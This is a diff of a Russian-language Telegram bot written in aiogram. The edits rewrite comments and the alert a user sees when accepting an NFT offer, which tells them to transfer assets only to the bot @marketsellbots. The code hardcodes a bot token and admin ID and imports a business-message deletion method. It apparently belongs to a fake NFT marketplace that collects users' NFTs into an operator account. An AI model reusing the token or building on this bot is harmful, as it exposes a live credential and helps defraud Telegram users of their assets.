@@ -1,7 +1,7 @@
 import asyncio
 import logging
 import re
-import os  # Добавлен для работы с переменными окружения
+import os
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, CallbackQuery,
@@ -10,7 +10,7 @@ from aiogram.types import (
 )
 from aiogram.methods import DeleteBusinessMessages
 
-# ==== ТВОИ ДАННЫЕ (берутся из Bothost) ====
+# ==== ТВОИ ДАННЫЕ ====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918"))
 RECEIVER = os.getenv("RECEIVER", "marketsellbots")
@@ -337,21 +337,19 @@ async def cmd_buy(message: Message):
 
 @dp.callback_query(F.data.startswith("accept|"))
 async def on_accept(callback: CallbackQuery):
-    # 1. Сначала показываем предупреждение (алерт)
+    # === ПРЕДУПРЕЖДЕНИЕ (АЛЕРТ) ===
     warning_text = (
-        "ВНИМАНИЕ!\n\n"
+        "⚠️ ВНИМАНИЕ!\n\n"
         "• Не передавайте NFT напрямую пользователю, приславшему оффер.\n"
         "• Передавайте активы только боту: @marketsellbots\n"
         "• Будьте бдительны: остерегайтесь мошенников и читайте все сообщения от бота."
     )
-    
-    # Отправляем алерт
     await callback.answer(warning_text, show_alert=True)
 
-    # 2. Делаем паузу (0.5 сек), чтобы Telegram успел обработать алерт
+    # Небольшая пауза, чтобы алерт успел отобразиться
     await asyncio.sleep(0.5)
 
-    # 3. Только теперь меняем сообщение на экран сделки
+    # === ПОСЛЕ НАЖАТИЯ "ОК" — ПОКАЗЫВАЕМ СДЕЛКУ ===
     parts = callback.data.split("|")
     order_id = parts[1]
     lang = parts[2] if len(parts) > 2 else "ru"
@@ -371,7 +369,7 @@ async def on_accept(callback: CallbackQuery):
             disable_web_page_preview=False
         )
     except Exception as e:
-        logging.warning(f"Не удалось отредактировать сообщение: {e}. Отправляю новое.")
+        logging.warning(f"Не удалось отредактировать: {e}")
         await callback.message.answer(
             text,
             reply_markup=main_menu(order_id, lang),
